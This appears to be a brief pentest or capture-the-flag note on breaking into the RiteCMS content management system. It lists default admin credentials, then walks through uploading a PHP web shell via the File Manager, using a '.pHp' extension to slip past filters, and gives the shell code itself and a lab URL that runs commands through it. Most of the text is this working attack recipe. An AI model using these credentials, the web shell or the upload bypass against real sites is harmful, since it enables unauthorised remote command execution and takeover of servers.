RiteCMS

RiteCMS is a lightweight, open-source content management system designed for simplicity and ease of use. It provides a user-friendly interface for managing website content without requiring extensive technical knowledge.

Enumeration

    admin:admin
admin:password

Exploitation

    Once inside the admin panel you can upload your malicious shell. Follow the steps below:

    Go to admin (At the bottom of the page)

    Go to File Manager and upload your shell

    It is recommended to upload a shell with the following extension: .pHp

    <?php system($_GET["cmd"]); ?> #Here is a shell example

    Once uploaded, you can access your shell by navigating to the following path

    http://192.168.224.249:8000/cms/media/shell.pHp?cmd=whoami
